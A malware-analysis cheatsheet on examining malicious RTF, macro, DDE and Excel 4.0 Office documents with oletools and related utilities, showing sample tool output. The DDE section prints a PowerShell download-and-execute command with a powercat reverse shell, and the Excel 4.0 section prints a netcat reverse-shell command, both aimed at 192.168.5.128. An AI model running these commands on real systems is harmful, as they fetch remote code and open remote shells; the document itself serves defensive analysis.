---
title: "Malicious document analysis Notes and Cheatsheet"
date: "2020-12-15"
layout: single
tags:
- Malware
categories:
- Notes
---

# RTF
RTF exploit list:
 - CVE-2018-8570 
 - CVE-2018-0802 
 - CVE-2017-11882 
 - CVE-2017-0199
 - CVE-2015-1641 
 - CVE-2014-1761 
 - CVE-2012-0158

Use **rtfobj** to inspect and extract embedded objects from RTF files.

    remnux@remnux:~/Desktop$ rtfobj malicious.rtf
    rtfobj 0.55 on Python 3.6.9 - http://decalage.info/python/oletools
    THIS IS WORK IN PROGRESS - Check updates regularly!
    Please report any issue at https://github.com/decalage2/oletools/issues
    
    ===============================================================================
    File: 'malicious.rtf' - size: 401748 bytes
    ---+----------+---------------------------------------------------------------
    id |index     |OLE Object                                                     
    ---+----------+---------------------------------------------------------------
    0  |0001076Ah |format_id: 2 (Embedded)                                        
       |          |class name: b'Package'                                         
       |          |data size: 159944                                              
       |          |OLE Package object:                                            
       |          |Filename: '8.t'                                                
       |          |Source path: 'C:\\Aaa\\tmp\\8.t'                               
       |          |Temp path = 'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t'   
       |          |MD5 = '9bffe424e9b7be9e1461a3218923e110'                       
    ---+----------+---------------------------------------------------------------
    1  |0005E98Ah |format_id: 2 (Embedded)                                        
       |          |class name: b'Equation.2\x00\x124Vx\x90\x124VxvT2'             
       |          |data size: 6436                                                
       |          |MD5 = 'a09e82c26f94f3a9297377120503a678'                       
    ---+----------+---------------------------------------------------------------
    2  |0005E970h |Not a well-formed OLE object                                   
    ---+----------+---------------------------------------------------------------

To dump specific OLE Object:

    remnux@remnux:~/Desktop$ rtfobj malicious.rtf -s 2
    rtfobj 0.55 on Python 3.6.9 - http://decalage.info/python/oletools
    THIS IS WORK IN PROGRESS - Check updates regularly!
    Please report any issue at https://github.com/decalage2/oletools/issues
    
    
    ===============================================================================
    File: 'malicious.rtf' - size: 401748 bytes
    ---+----------+---------------------------------------------------------------
    id |index     |OLE Object                                                     
    ---+----------+---------------------------------------------------------------
    0  |0001076Ah |format_id: 2 (Embedded)                                        
       |          |class name: b'Package'                                         
       |          |data size: 159944                                              
       |          |OLE Package object:                                            
       |          |Filename: '8.t'                                                
       |          |Source path: 'C:\\Aaa\\tmp\\8.t'                               
       |          |Temp path = 'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t'   
       |          |MD5 = '9bffe424e9b7be9e1461a3218923e110'                       
    ---+----------+---------------------------------------------------------------
    1  |0005E98Ah |format_id: 2 (Embedded)                                        
       |          |class name: b'Equation.2\x00\x124Vx\x90\x124VxvT2'             
       |          |data size: 6436                                                
       |          |MD5 = 'a09e82c26f94f3a9297377120503a678'                       
    ---+----------+---------------------------------------------------------------
    2  |0005E970h |Not a well-formed OLE object                                   
    ---+----------+---------------------------------------------------------------
    Saving raw data in object #0:
      saving object to file malicious.rtf_object_0005E970.raw
      md5 a3540560cf9b92c3bc4aa0ed52767b

Alternatively, use rtfdump.py to analyze RTF. Below command list groups and structure of RTF.

    remnux@remnux:~/Desktop$ rtfdump.py mal.rtf 
        1 Level  1        c=  124 p=00000000 l=  401423 h=  349186;  319968 b=       0   u=    5079 \rtf1
        2  Level  2       c=  115 p=000000b7 l=    8126 h=     950;      20 b=       0   u=    1383 \fonttbl
        3   Level  3      c=    1 p=000000c0 l=      82 h=      23;      20 b=       0   u=      11 \f0
        4    Level  4     c=    0 p=000000e2 l=      31 h=      20;      20 b=       0   u=       0 \*\panose
        5   Level  3      c=    1 p=00000113 l=      72 h=      22;      20 b=       0   u=       4 \f1
    <---snip--->
      330  Level  2       c=    0 p=0000fab5 l=    3226 h=    3184;     252 b=       0 O u=       0 \*\datastore
          Name: 'Msxml2.SAXXMLReader.6.0\x00' Size: 1536 md5: 07ea196e1a0674f7ce220b6ae8c61cb7 magic: d0cf11e0
      331  Level  2       c=    2 p=00010750 l=  320007 h=  319968;  319968 b=       0 O u=       0 \object
          Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e
      332   Level  3      c=    0 p=0001075f l=  319980 h=  319968;  319968 b=       0 O u=       0 \*\objdata
          Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e
      333   Level  3      c=    0 p=0005e94c l=      10 h=       0;       0 b=       0   u=       0 \result
      334  Level  2       c=    1 p=0005e958 l=   14006 h=   13415;   13407 b=       0   u=       1 \object
      335   Level  3      c=    1 p=0005e967 l=   13979 h=   13415;   13407 b=       0   u=       0 \objdata
      336    Level  4     c=    1 p=0005e97f l=   13954 h=   13407;   13407 b=       0   u=       0 \*\objdata
      337     Level  5    c=    0 p=0005e98b l=     534 h=     279;     279 b=       0   u=       0 \ods0000000000000000000000000000000000000000000010034533010342038422221556620832358404453773117665770487510150778730755613138068475808657687162582054482186656468762876881030061344325218221648318281400000000000000000000000000000000000000000000000000000000
      338 Remainder       c=    0 p=00062010 l=     324 h=       0;       0 b=       0   u=     324 
          Only NULL bytes = 324

To reduce the output but filtering for the entries that potentially contain the embedded objects, we can use-f O.

    remnux@remnux:~/Desktop$ rtfdump.py mal.rtf -f O
      330  Level  2       c=    0 p=0000fab5 l=    3226 h=    3184;     252 b=       0 O u=       0 \*\datastore
          Name: 'Msxml2.SAXXMLReader.6.0\x00' Size: 1536 md5: 07ea196e1a0674f7ce220b6ae8c61cb7 magic: d0cf11e0
      331  Level  2       c=    2 p=00010750 l=  320007 h=  319968;  319968 b=       0 O u=       0 \object
          Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e
      332   Level  3      c=    0 p=0001075f l=  319980 h=  319968;  319968 b=       0 O u=       0 \*\objdata
          Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e

To dump specific group:

    rtfdump.py mal.rtf -s 330 -H -d > output.bin

Royal Road exploit kit version:

![enter image description here](https://nao-sec.org/assets/2020-01-30/version.png)
Source: [An Overhead View of the Royal Road | @nao_sec (nao-sec.org)](https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html)

# Template injection
Reside in `word/_rels/settings.xml.rels` 

# Macro attack
Use **oledump** to analyze and extract OLE files

`oledump.py filename.doc` = Generally analyze streams that contain macro

    remnux@remnux:~/Desktop$ oledump.py macro-sample.xls 
      1:       107 '\x01CompObj'
      2:       244 '\x05DocumentSummaryInformation'
      3:       200 '\x05SummaryInformation'
      4:     14882 'Workbook'
      5:       740 '_VBA_PROJECT_CUR/PROJECT'
      6:       182 '_VBA_PROJECT_CUR/PROJECTwm'
      7:        97 '_VBA_PROJECT_CUR/UserForm1/\x01CompObj'
      8:       293 '_VBA_PROJECT_CUR/UserForm1/\x03VBFrame'
      9:       187 '_VBA_PROJECT_CUR/UserForm1/f'
     10:    443812 '_VBA_PROJECT_CUR/UserForm1/o'
     11: M    2423 '_VBA_PROJECT_CUR/VBA/Module1'
     12: M    3251 '_VBA_PROJECT_CUR/VBA/Module2'
     13: m     977 '_VBA_PROJECT_CUR/VBA/Sheet1'
     14: m     977 '_VBA_PROJECT_CUR/VBA/Sheet2'
     15: m     977 '_VBA_PROJECT_CUR/VBA/Sheet3'
     16: M    1275 '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
     17: M    1907 '_VBA_PROJECT_CUR/VBA/UserForm1'
     18:      4402 '_VBA_PROJECT_CUR/VBA/_VBA_PROJECT'
     19:       926 '_VBA_PROJECT_CUR/VBA/dir'

`oledump.py filename.xls -s 11 -v` = Extract macro for the stream 11 for example

    remnux@remnux:~/Desktop$ oledump.py macro-sample.xls -s 16 -v
    Attribute VB_Name = "ThisWorkbook"
    Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
    Attribute VB_GlobalNameSpace = False
    Attribute VB_Creatable = False
    Attribute VB_PredeclaredId = True
    Attribute VB_Exposed = True
    Attribute VB_TemplateDerived = False
    Attribute VB_Customizable = True
    Private Sub Workbook_Open()
      Call userAldiLoadr
      Sheet3.Visible = xlSheetVisible
     Sheet3.Copy
     End Sub

Use **olevba3** to parse OLE and OpenXML files such as MS Office documents (e.g. Word, Excel), to extract VBA Macro code in clear text, deobfuscate and analyze malicious macros

    remnux@remnux:~/Desktop$ olevba3 macro-sample.xls
    olevba 0.55.1 on Python 3.6.9 - http://decalage.info/python/oletools
    ===============================================================================
    FILE: macro-sample.xls
    Type: OLE
    -------------------------------------------------------------------------------
    VBA MACRO ThisWorkbook.cls 
    in file: macro-sample.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    Private Sub Workbook_Open()
      Call userAldiLoadr
      Sheet3.Visible = xlSheetVisible
     Sheet3.Copy
     End Sub
    <---snip--->
    +----------+--------------------+---------------------------------------------+
    |Type      |Keyword             |Description                                  |
    +----------+--------------------+---------------------------------------------+
    |AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
    |AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
    |          |                    |objects trigger events                       |
    |Suspicious|Environ             |May read system environment variables        |
    |Suspicious|Open                |May open a file                              |
    |Suspicious|Write               |May write to a file (if combined with Open)  |
    |Suspicious|Put                 |May write to a file (if combined with Open)  |
    |Suspicious|Binary              |May read or write a binary file (if combined |
    |          |                    |with Open)                                   |
    |Suspicious|Shell               |May run an executable file or a system       |
    |          |                    |command                                      |
    |Suspicious|vbNormalNoFocus     |May run an executable file or a system       |
    |          |                    |command                                      |
    |Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
    |Suspicious|MkDir               |May create a directory                       |
    |Suspicious|CreateObject        |May create an OLE object                     |
    |Suspicious|Shell.Application   |May run an application (if combined with     |
    |          |                    |CreateObject)                                |
    |Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
    |          |                    |used to obfuscate strings (option --decode to|
    |          |                    |see all)                                     |
    +----------+--------------------+---------------------------------------------+

**mraptor** is a tool designed to detect most malicious VBA Macros using generic heuristics.

    remnux@remnux:~/Desktop$ mraptor -m macro-sample.xls 
    MacroRaptor 0.55 - http://decalage.info/python/oletools
    This is work in progress, please report issues at https://github.com/decalage2/oletools/issues
    ----------+-----+----+--------------------------------------------------------
    Result    |Flags|Type|File                                                    
    ----------+-----+----+--------------------------------------------------------
    SUSPICIOUS|AWX  |OLE:|macro-sample.xls                                        
              |     |    |Matches: ['Workbook_Open', 'MkDir', 'CreateObject']     
    
    Flags: A=AutoExec, W=Write, X=Execute
    Exit code: 20 - SUSPICIOUS

Use **ViperMonkey** to emulate the VBA. Vmonkey is a VBA Emulation engine written in Python, designed to analyze and deobfuscate malicious VBA Macros contained in Microsoft Office files.

    remnux@remnux:~/Desktop$ vmonkey macro-sample.xls
    Pcode (if macro destroy)
    Use pcodedmp to disassemble p-code macro code from filename.doc
    remnux@remnux:~/Desktop$ pcodedmp macro-sample.xls -d
    Processing file: macro-sample.xls
    ===============================================================================
    Module streams:
    _VBA_PROJECT_CUR/VBA/ThisWorkbook - 1275 bytes
    Line #0:
    	FuncDefn (Private Sub Workbook_Open())
    Line #1:
    	ArgsCall (Call) userAldiLoadr 0x0000 
    Line #2:
    	Ld xlSheetVisible 
    	Ld Sheet3 
    <---snip--->
    Line #4:
    	Ld xl3DAreaStacked 
    	MemStWith LineStyle 
    Line #5:
    Line #6:
    	EndWith 
    Line #7:
    Line #8:
    	StartWithExpr 
    	Ld xlEdgeRight 
    	Ld Selection 
    	ArgsMemLd Borders 0x0001
    <---snip--->
    Line #20:
    	FuncDefn (Sub Maceo8())

# DDE attack
Use **msodde** to detect and extract DDE/DDEAUTO links from MS Office documents, RTF and CSV

    remnux@remnux:~/Desktop$ msodde DDE-attack.docx 
    msodde 0.55 - http://decalage.info/python/oletools
    THIS IS WORK IN PROGRESS - Check updates regularly!
    Please report any issue at https://github.com/decalage2/oletools/issues
    
    Opening file: DDE-attack.docx
    DDE Links:
     DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.5.128/powercat.ps1');powercat -c 192.168.5.128 -p 1111 -e cmd

# Excel 4.0 macros
**XLMMacroDeobfuscator** can be used to decode obfuscated XLM macros (also known as Excel 4.0 macros)

    remnux@remnux:~/Desktop$ xlmdeobfuscator -f excel4macro.xls 
    pywin32 is not installed (only is required if you want to use MS Excel)
    
              _        _______
    |\     /|( \      (       )
    ( \   / )| (      | () () |
     \ (_) / | |      | || || |
      ) _ (  | |      | |(_)| |
     / ( ) \ | |      | |   | |
    ( /   \ )| (____/\| )   ( |
    |/     \|(_______/|/     \|
       ______   _______  _______  ______   _______           _______  _______  _______ _________ _______  _______
      (  __  \ (  ____ \(  ___  )(  ___ \ (  ____ \|\     /|(  ____ \(  ____ \(  ___  )\__   __/(  ___  )(  ____ )
      | (  \  )| (    \/| (   ) || (   ) )| (    \/| )   ( || (    \/| (    \/| (   ) |   ) (   | (   ) || (    )|
      | |   ) || (__    | |   | || (__/ / | (__    | |   | || (_____ | |      | (___) |   | |   | |   | || (____)|
      | |   | ||  __)   | |   | ||  __ (  |  __)   | |   | |(_____  )| |      |  ___  |   | |   | |   | ||     __)
      | |   ) || (      | |   | || (  \ \ | (      | |   | |      ) || |      | (   ) |   | |   | |   | || (\ (
      | (__/  )| (____/\| (___) || )___) )| )      | (___) |/\____) || (____/\| )   ( |   | |   | (___) || ) \ \__
      (______/ (_______/(_______)|/ \___/ |/       (_______)\_______)(_______/|/     \|   )_(   (_______)|/   \__/
    
        
    XLMMacroDeobfuscator(v 0.1.4) - https://github.com/DissectMalware/XLMMacroDeobfuscator
    
    File: /home/remnux/Desktop/excel4macro.xls
    
    Unencrypted xls file
    
    [Loading Cells]
    [Starting Deobfuscation]
    There is no entry point, please specify a cell address to start
    Example: Sheet1!A1
    Macro1!A1
    CELL:A1        , PartialEvaluation   , EXEC("nc -nv 192.168.5.128 1111 -e cmd.exe")
    CELL:A2        , PartialEvaluation   , RETURN()
    [END of Deobfuscation]
    time elapsed: 5.669408082962036



